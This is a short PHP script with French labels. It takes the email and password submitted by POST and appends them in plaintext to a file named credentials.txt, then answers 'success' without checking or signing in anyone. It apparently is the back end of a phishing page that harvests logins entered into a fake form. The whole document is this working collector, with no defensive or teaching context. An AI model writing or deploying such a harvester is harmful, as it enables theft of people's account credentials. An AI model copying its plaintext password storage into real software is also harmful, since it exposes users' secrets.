<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST["email"]) ? $_POST["email"] : "Non renseigné";
    $password = isset($_POST["password"]) ? $_POST["password"] : "Non renseigné";
    
    $data = "Email: " . $email . " | Mot de passe: " . $password . "\n";

    file_put_contents("credentials.txt", $data, FILE_APPEND);

    echo "success";
}
?>


